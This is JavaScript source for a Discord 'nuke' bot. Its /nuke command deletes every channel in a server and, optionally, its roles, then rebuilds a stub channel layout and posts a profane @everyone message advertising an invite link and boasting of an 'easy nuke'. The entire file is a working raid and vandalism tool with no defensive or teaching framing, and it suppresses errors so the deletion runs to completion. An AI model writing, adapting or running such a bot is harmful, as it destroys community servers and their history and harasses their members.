import 'dotenv/config';
import {
  Client, GatewayIntentBits, Events, ChannelType, MessageFlags,
  PermissionFlagsBits,
} from 'discord.js';

/* ------------------------------------------------------------------ config */

// always posted after a nuke — edit this line to change the text
const NUKE_MESSAGE =
  "@everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS";

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

/* ------------------------------------------------------------------ events */

client.once(Events.ClientReady, c => {
  console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
});

client.on(Events.Error, err => console.error('[client]', err));

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;

  try {
    if (interaction.commandName === 'help') return await help(interaction);
    if (interaction.commandName === 'nuke') return await nuke(interaction);
  } catch (err) {
    console.error(err);
    const payload = {
      content: `Error: \`${err.message}\``,
      flags: MessageFlags.Ephemeral,
    };
    if (interaction.deferred || interaction.replied) {
      await interaction.editReply(payload).catch(() => {});
    } else {
      await interaction.reply(payload).catch(() => {});
    }
  }
});

/* ---------------------------------------------------------------- commands */

async function help(interaction) {
  return interaction.reply({
    content: [
      '**Commands**',
      '`/nuke [roles]` — delete every channel and rebuild the server',
      '`/help` — this message',
    ].join('\n'),
    flags: MessageFlags.Ephemeral,
  });
}

async function nuke(interaction) {
  const { guild } = interaction;
  if (!guild) {
    return interaction.reply({
      content: 'Run this inside a server.',
      flags: MessageFlags.Ephemeral,
    });
  }

  const wipeRoles = interaction.options.getBoolean('roles') ?? false;

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  const me = guild.members.me;

  if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
    return interaction.editReply('I need the **Manage Channels** permission.');
  }

  // 1. roles (optional)
  if (wipeRoles) {
    if (!me.permissions.has(PermissionFlagsBits.ManageRoles)) {
      console.warn('Skipping roles: missing Manage Roles.');
    } else {
      for (const role of [...guild.roles.cache.values()]) {
        if (role.managed) continue;                                  // bot/integration roles
        if (role.id === guild.id) continue;                          // @everyone
        if (role.comparePositionTo(me.roles.highest) >= 0) continue;  // higher than us
        await role.delete().catch(() => {});
      }
    }
  }

  // 2. channels — snapshot first, the cache mutates as we delete
  for (const channel of [...guild.channels.cache.values()]) {
    await channel.delete().catch(() => {});
  }

  // 3. rebuild
  const category = await guild.channels.create({
    name: 'general',
    type: ChannelType.GuildCategory,
  });

  const text = await guild.channels.create({
    name: 'general',
    type: ChannelType.GuildText,
    parent: category.id,
  });

  await guild.channels.create({
    name: 'voice',
    type: ChannelType.GuildVoice,
    parent: category.id,
  });

  // 4. always spam it
  await text.send(NUKE_MESSAGE).catch(() => {});

  // the origin channel is gone by now, so this can fail harmlessly
  await interaction.editReply('Done. Server rebuilt.').catch(() => {});
}

client.login(process.env.DISCORD_TOKEN);
